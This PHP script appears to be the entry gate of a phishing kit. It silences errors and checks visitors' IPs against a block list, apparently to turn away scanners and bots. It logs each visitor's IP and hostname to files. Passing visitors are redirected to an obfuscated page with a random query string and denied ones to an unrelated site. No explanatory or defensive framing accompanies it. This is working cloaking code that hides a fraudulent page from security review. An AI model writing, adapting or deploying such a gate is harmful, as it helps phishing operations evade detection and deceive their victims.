<?php
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
require_once("assets/includes/functions.php");
$v_ip      = $_SERVER['REMOTE_ADDR'];
$v_isp     = gethostbyaddr($v_ip);
$v_date    = date("D d M H:i:s");
$ips       = array(
  $_SERVER['REMOTE_ADDR']
);
$checklist = new IpBlockList();
foreach ($ips as $ip) {
  $result = $checklist->ipPass($ip);
  if ($result) {
    $msg = "PASSED: " . $checklist->message();
    $fp  = fopen("assets/logs/accepted_visitors.txt", "a");
    fputs($fp, "[ $v_date ] $v_ip - $v_isp\r\n");
    fclose($fp);
    session_start();
    $_SESSION['page_a_visited'] = true;
    redirectTo("Cgi.php?21c522112f91f4e1f0863c2a94b=true&ged=" . generateRandomString(80));
  } else {
    $msg = "FAILED: " . $checklist->message();
    $fp  = fopen("assets/logs/denied_visitors.txt", "a");
    fputs($fp, "[ $v_date ] $v_ip - $v_isp\r\n");
    fclose($fp);
    header("Location: https://whattodo.com");
    die();
  }
}
?>